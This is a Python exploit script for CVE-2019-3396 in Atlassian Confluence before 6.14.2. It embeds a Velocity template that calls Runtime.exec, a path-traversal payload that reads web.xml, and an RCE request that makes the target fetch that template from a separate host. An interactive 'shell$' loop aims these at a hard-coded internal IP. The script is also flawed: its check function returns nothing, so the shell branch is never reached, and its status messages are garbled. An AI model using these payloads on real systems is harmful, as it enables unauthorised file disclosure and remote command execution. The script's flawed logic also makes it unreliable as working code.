# -*- coding：utf-8 -*-
#python3
'''
CVE-2019-3396 confluence<6.14.2版本前存在一处未授权的目录穿越漏洞可以读取任意文件，
或利用Velocity模板注入执行任意命令,test.vm代码如下：
#set ($exp="exp")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
'''

import requests
import time

requests.packages.urllib3.disable_warnings()
headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Connection': "close",
    'Content-Type': "application/json",
}
def check_confluence_read(url_dir):
    payload = '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}'
    res = requests.post(url=url_dir, headers=headers, data=payload, timeout=3, verify=False)
    print(res.text)


def exploit_confluence_rce(url_dir,cmd):
    payload = '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"https://192.168.43.1/test.vm","command":%s}}}'%cmd
    res = requests.post(url=url_dir, headers=headers, data=payload, timeout=3, verify=False)
    print(res.text)

def verify(protol, ip, port):
    ip = ip.strip()
    if port.strip():
        url_dir = protol.strip() + "://" + ip + ":" + port.strip() + "/rest/tinymce/1/macro/preview"
    else:
        url_dir = protol.strip() + "://" + ip + "/rest/tinymce/1/macro/preview"
    try:
        if check_confluence_read(url_dir):
            print("----------------[+] Find Confluence<6.14.2_rce CVE-2019-3396 Vuln!。Iuput [exit] to out! [+]----------------")
            while 1:
                cmd = str(input("shell$: ")).strip()
                if cmd == "exit":
                    exit(1)
                else:
                    exploit_confluence_rce(url_dir, cmd)
        else:
            print("[-] There is Seem Confluence<6.14.2_rce CVE-2019-3396 Vuln!")

    except Exception as e:
        print("[-] There is Not Seem Confluence<6.14.2_rce CVE-2019-3396 Vuln! Error: %s "%str(e))

if __name__ == '__main__':
    ip =  "    192.168.43.90                          "
    verify("http",ip, " 8090")